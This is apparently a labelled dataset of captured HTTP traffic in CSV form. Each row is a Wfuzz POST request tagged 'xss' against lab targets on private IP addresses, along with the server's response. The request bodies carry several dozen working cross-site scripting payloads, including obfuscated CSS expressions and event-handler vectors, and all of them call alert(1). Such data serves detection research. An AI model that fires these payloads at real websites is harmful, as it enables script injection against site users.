attack_tag,dst_ip,dst_port,req_body,req_header_Accept,req_header_Content_Length,req_header_Content_Type,req_header_Host,req_header_User_Agent,req_method,req_url,res_body,res_header_Connection,res_header_Content_Length,res_header_Content_Type,res_header_Date,res_header_Response_Code,res_header_Server,src_ip,src_port
xss,192.168.1.39,80,name=<div style=xss:expressio\00006e(alert(1))>&submit=send,*/*,59,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;div style=xss:expressio\00006e(alert(1))&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",,406,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:32 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49464
xss,192.168.1.39,80,name=<div style=xss:expression(alert(1))>&submit=send,*/*,53,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;div style=xss:expression(alert(1))&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",,400,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:32 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49465
xss,192.168.1.39,80,name=<div style=xss:expressio\006e(alert(1))>&submit=send,*/*,57,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;div style=xss:expressio\006e(alert(1))&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",,404,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:32 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49466
xss,192.168.1.39,80,name=<div style=xss:expressio\6e(alert(1))>&submit=send,*/*,55,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;div style=xss:expressio\6e(alert(1))&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",,402,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:32 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49467
xss,192.168.1.39,80,name=<svg onload=(alert)(1)>&submit=send,*/*,40,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;svg onload=(alert)(1)&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",,387,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:32 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49468
xss,192.168.1.39,80,"name=<form><button formaction=""javascript:alert(1)"">&submit=send",*/*,64,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;form&gt;&lt;button formaction=&quot;javascript:alert(1)&quot;&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",,427,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:31 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49469
xss,192.168.1.39,80,name=<marguee/onstart=alert(1)>&submit=send,*/*,43,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;marguee/onstart=alert(1)&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",,390,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:32 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49470
xss,192.168.1.39,80,"name=<script>$=1,alert($)</script>&submit=send",*/*,46,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;script&gt;$=1,alert($)&lt;/script&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",,399,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:32 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49471
xss,192.168.60.165,80,"name=<audio onclick=""alert(1)"">test</audio>",*/*,43,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:47 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,50034
xss,192.168.60.165,80,"name=<center onclick=""alert(1)"">test</center>",*/*,45,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:48 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,50086
xss,192.168.60.165,80,"name=<audio autoplay controls onvolumechange=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",*/*,108,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:47 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,50022
xss,192.168.60.165,80,"name=<base onmouseup=""alert(1)"">test</base>",*/*,43,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:47 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,50042
xss,192.168.60.165,80,name=<bdi onfocusout=alert(1) tabindex=1 id=x></bdi><input autofocus>,*/*,69,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:47 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,50050
xss,192.168.60.165,80,"name=<blockquote onkeypress=""alert(1)"" contenteditable>test</blockquote>",*/*,72,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:48 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,50066
xss,192.168.60.165,80,"name=<canvas onbeforepaste=""alert(1)"" contenteditable>test</canvas>",*/*,67,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:48 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,50070
xss,192.168.60.165,80,"name=<command onkeydown=""alert(1)"" contenteditable>test</command>",*/*,65,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:48 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,50090
xss,192.168.60.165,80,"name=<datalist draggable=""true"" ondragenter=""alert(1)"">test</datalist>",*/*,70,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:48 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,50098
xss,192.168.60.165,80,"name=<details onmouseout=""alert(1)"">test</details>",*/*,50,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:49 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,50104
xss,192.168.60.165,80,"name=<div draggable=""true"" contenteditable>drag me</div><bgsound ondrop=alert(1) contenteditable>drop here</bgsound>",*/*,116,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:49 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,50116
xss,192.168.60.165,80,"name=<div draggable=""true"" contenteditable>drag me</div><col ondragover=alert(1) contenteditable>drop here</col>",*/*,112,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:49 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,50128
xss,192.168.60.165,80,"name=<div draggable=""true"" contenteditable>drag me</div><nextid ondragover=alert(1) contenteditable>drop here</nextid>",*/*,118,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:49 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,56866
xss,192.168.60.165,80,"name=<div draggable=""true"" ondragenter=""alert(1)"">test</div>",*/*,60,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:49 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,56870
xss,192.168.60.165,80,"name=<em onclick=""alert(1)"">test</em>",*/*,37,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:49 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,56876
xss,192.168.60.165,80,name=<figcaption id=x tabindex=1 onfocusin=alert(1)></figcaption>,*/*,65,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:50 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,56880
xss,192.168.60.165,80,"name=<font onmouseleave=""alert(1)"">test</font>",*/*,46,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:50 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,56894
xss,192.168.60.165,80,"name=<frameset draggable=""true"" ondragend=""alert(1)"">test</frameset>",*/*,68,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:50 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,56908
xss,192.168.60.165,80,name=<frameset><frame onload=alert(1)>,*/*,38,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:50 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,56922
xss,192.168.60.165,80,"name=<i onmouseleave=""alert(1)"">test</i>",*/*,40,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:50 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,56932
xss,192.168.60.165,80,name=<image onblur=alert(1) tabindex=1 id=x></image><input autofocus>,*/*,69,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:50 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,56940
xss,192.168.60.165,80,"name=<input onmousemove=""alert(1)"">test</input>",*/*,47,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:50 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,56944
xss,192.168.60.165,80,"name=<keygen draggable=""true"" ondragend=""alert(1)"">test</keygen>",*/*,64,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:50 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,56958
xss,192.168.60.165,80,name=<label id=x tabindex=1 ondeactivate=alert(1)></label><input id=y autofocus>,*/*,80,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:51 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,56970
xss,192.168.60.165,80,"name=<listing onmouseover=""alert(1)"">test</listing>",*/*,51,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:51 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,56980
xss,192.168.60.165,80,"name=<map onmouseleave=""alert(1)"">test</map>",*/*,44,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:51 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,56988
xss,192.168.60.165,80,"name=<marquee onmouseover=""alert(1)"">test</marquee>",*/*,51,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:51 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,56994
xss,192.168.60.165,80,"name=<multicol draggable=""true"" ondragleave=""alert(1)"">test</multicol>",*/*,70,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:51 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57004
xss,192.168.60.165,80,"name=<nobr onbeforecut=""alert(1)"" contenteditable>test</nobr>",*/*,61,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:51 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57020
xss,192.168.60.165,80,"name=<noscript draggable=""true"" ondragend=""alert(1)"">test</noscript>",*/*,68,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:51 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57028
xss,192.168.60.165,80,name=<ol id=x tabindex=1 ondeactivate=alert(1)></ol><input id=y autofocus>,*/*,74,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:52 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57038
xss,192.168.60.165,80,"name=<pre ondblclick=""alert(1)"">test</pre>",*/*,42,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:52 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57040
xss,192.168.60.165,80,"name=<q draggable=""true"" ondragend=""alert(1)"">test</q>",*/*,54,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:52 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57050
